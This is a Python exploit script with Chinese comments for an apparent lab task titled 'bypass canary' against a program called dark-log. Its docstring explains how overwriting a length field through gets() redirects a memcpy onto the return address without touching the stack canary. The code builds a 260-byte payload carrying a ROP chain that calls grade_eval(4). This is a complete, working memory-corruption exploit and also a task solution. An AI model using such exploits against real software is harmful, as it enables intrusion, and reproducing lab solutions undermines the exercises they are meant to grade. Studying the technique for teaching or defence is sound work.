#!/usr/bin/env python3
"""Task 4: 绕过 Canary —— dark-log

input() 的栈帧（源码里的 struct log_frame）：
    char expression[128]   位于 rbp-0x120   <- gets() 的缓冲区
    char logMsg[128]       位于 rbp-0x0a0
    int  len               位于 rbp-0x020
    char pad[8]
    canary                 位于 rbp-0x008
    saved rbp              位于 rbp+0x00
    返回地址                 位于 rbp+0x008

gets() 想写到返回地址，必须踩过 canary，一旦改了 canary 就会 __stack_chk_fail。
但这个程序还留了第二个 bug：

    memcpy(f.logMsg + f.len, f.expression, sizeof(f.expression));
    即 dest = rbp - 0xa0 + len，拷贝 128 字节

len 正好在 canary 下面 8 字节处，只要输入长度 ≥260 就能改掉 len，却还碰不到 canary。
把 len 设成 0xa8：dest = rbp + 8，也就是**刚好从返回地址开始**写 128 字节，
于是 canary 完好无损，返回地址却被整条 ROP 链覆盖了。

payload 布局：
    0   .. 127   会被 memcpy 搬到 rbp+8 的 ROP 链
    128 .. 255   填满 logMsg（会被覆盖，无所谓）
    256 .. 259   f.len = 0xa8
总长正好 260 字节（gets 补的 NUL 落在 pad 里，仍然够不到 canary）。
"""
import struct
import sys

POP_RDI = 0x4018A3
GRADE_EVAL = 0x401677
NEW_LEN = 0xA8      # dest = rbp - 0xa0 + 0xa8 = rbp + 8

chain = struct.pack("<Q", POP_RDI)      # pop rdi ; ret
chain += struct.pack("<Q", 4)           # rdi = 4
chain += struct.pack("<Q", GRADE_EVAL)  # grade_eval(4) 内部会 fflush
chain += struct.pack("<Q", 0)           # 返回 0（之后崩掉也无所谓，输出已 flush）

payload = chain.ljust(128, b"C")        # 前 128 字节 = 被搬走的 ROP 链
payload += b"D" * (256 - len(payload))  # 填满 logMsg
payload += struct.pack("<I", NEW_LEN)   # 改写 f.len

assert len(payload) == 260
sys.stdout.buffer.write(payload)
